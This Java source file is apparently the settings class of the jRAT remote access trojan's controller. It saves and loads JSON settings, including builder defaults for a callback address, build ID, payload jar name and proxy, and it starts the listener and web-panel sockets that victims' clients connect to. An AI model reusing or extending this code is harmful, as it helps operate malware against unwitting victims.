package io.jrat.controller.settings;

import com.cedarsoftware.util.io.JsonObject;
import com.cedarsoftware.util.io.JsonReader;
import com.cedarsoftware.util.io.JsonWriter;
import io.jrat.common.crypto.Crypto;
import io.jrat.common.crypto.KeyUtils;
import io.jrat.controller.Globals;
import io.jrat.controller.exceptions.InvalidSocketTypeException;
import io.jrat.controller.net.PortListener;
import io.jrat.controller.net.ServerListener;
import io.jrat.controller.ui.Columns;
import io.jrat.controller.webpanel.WebPanelListener;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.Serializable;
import java.net.BindException;
import java.util.HashMap;
import java.util.Map;
import javax.swing.JOptionPane;
import javax.swing.UIManager;


public class Settings extends AbstractStorable {

	private static final Settings instance = new Settings();

	private transient JsonObject settings = new JsonObject();

	public static Settings getGlobal() {
		return instance;
	}

	public String getString(String key) {
		Object obj = settings.get(key);
		return obj == null ? "" : (String) obj;
	}

	public Object get(String key) {
		return settings.get(key);
	}

	public int getInt(String key) {
		Object obj = settings.get(key);
		return obj == null ? -1 : ((Long) obj).intValue();
	}

	public boolean getBoolean(String key) {
		Object obj = settings.get(key);
		return obj == null ? false : obj.toString().equalsIgnoreCase("true");
	}

	public void set(String key, Object value) {
		settings.put(key, value);
	}

	public void setColumn(String name, boolean show) {
		Map<String, Boolean> columns = (HashMap<String, Boolean>) settings.get("columns");
		columns.put(name, show);
	}

	public boolean isColumnSelected(String column) {
		Map<String, Boolean> columns = (HashMap<String, Boolean>) settings.get("columns");

		Boolean v = columns.get(column) == null || columns.get(column);

		return v;
	}

	public void load() throws Exception {
		try {
			Map args = new HashMap();
			args.put(JsonReader.USE_MAPS, true);

			settings = (JsonObject) JsonReader.jsonToJava(new FileInputStream(getFile()), args);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		if (settings.size() == 0) {
			addDefault();
		}
	}

	public void save() throws Exception {
		try {
			PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(getFile())));

			Map<String, Map<String, Object>> sockets = (HashMap<String, Map<String, Object>>) settings.get("sockets");

			// Save fresh socket data
			for (int i = 0; i < PortListener.listeners.size(); i++) {
				PortListener pl = PortListener.listeners.get(i);

				Map<String, Object> socketData = new HashMap<String, Object>();
				sockets.put(pl.getName(), socketData);

				socketData.put("port", pl.getPort());
				socketData.put("timeout", pl.getTimeout());
				socketData.put("type", pl.getType());
				socketData.put("pass", Crypto.encrypt(pl.getPass(), KeyUtils.STATIC_KEY.getEncoded()));
			}

			String[] themeargs = UIManager.getLookAndFeel().toString().split(" - ");
			String className = themeargs[1].substring(0, themeargs[1].length() - 1);

			// If theme is system default, set null
			if (className.equals(UIManager.getSystemLookAndFeelClassName())) {
				className = null;
			}

			settings.put("theme", className);

			Map args = new HashMap();
			args.put(JsonWriter.TYPE, false);
			pw.print(JsonWriter.formatJson(JsonWriter.objectToJson(settings, args)));

			pw.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static final String KEY_BUILD_ID = "build_id";
	public void addDefault() {
		set("bip", "127.0.0.1");
		set("bport", 1336);
		set("bid", "Name");
		set(KEY_BUILD_ID, "Client");
		set("bpass", "pass");
		set("brecat", 10);
		set("traynote", true);
		set("stats", true);
		set("jarname", "File");
		set("remotescreenstartup", false);
		set("askurl", true);
		set("max", -1);
		set("geoip", true);
		set("proxy", false);
		set("proxyhost", "127.0.0.1");
		set("proxyport", 9050);
		set("proxysocks", true);
		set("plugintransfer", false);
		set("rowheight", 30);

		Map<String, Boolean> columns = new HashMap<String, Boolean>();
		set("columns", columns);

		for (Columns c : Columns.values()) {
			columns.put(c.getName(), c.isDefault());
		}

		settings.put("sockets", new HashMap());

		settings.put("theme", null);
	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), "settings.json");
	}

	public void loadSockets() {
		Map<String, Map<String, Object>> sockets = (HashMap<String, Map<String, Object>>) Settings.getGlobal().get("sockets");

		for (String key : sockets.keySet()) {
			try {
				Map<String, Object> socket = sockets.get(key);

				int port = ((Long) socket.get("port")).intValue();
				int timeout = ((Long) socket.get("timeout")).intValue();
				int type = ((Long) socket.get("type")).intValue();
				String pass = Crypto.decrypt((String) socket.get("pass"), KeyUtils.STATIC_KEY.getEncoded());

				Settings.SocketEntry se = new Settings.SocketEntry(key, port, timeout, pass, type);
				se.start();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

	public class SocketEntry implements Serializable {

		private static final long serialVersionUID = -2000514812654090252L;

		private int type;
		private String pass;
		private int timeout;
		private int port;
		private String name;

		public SocketEntry(String name, int port, int timeout, String pass, int type) {
			this.name = name;
			this.port = port;
			this.timeout = timeout;
			this.pass = pass;
			this.type = type;
		}

		public String getPass() {
			return pass;
		}

		public int getTimeout() {
			return timeout;
		}

		public int getPort() {
			return port;
		}

		public String getName() {
			return name;
		}

		public int getType() {
			return type;
		}

		public void start() {
			try {
				if (type == SocketType.NORMAL_SOCKET) {
					ServerListener connection = new ServerListener(name, port, timeout, pass);
					connection.start();
				} else if (type == SocketType.WEB_PANEL_SOCKET) {
					WebPanelListener wpl = new WebPanelListener(name, port, pass);
					wpl.start();
				} else {
					throw new InvalidSocketTypeException();
				}
			} catch (BindException e) {
				JOptionPane.showMessageDialog(null, "Port " + port + " is already in use", "jRAT", JOptionPane.ERROR_MESSAGE);
				e.printStackTrace();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	}

	public class SocketType {
		public static final int NORMAL_SOCKET = 0;
		public static final int WEB_PANEL_SOCKET = 1;
	}
}
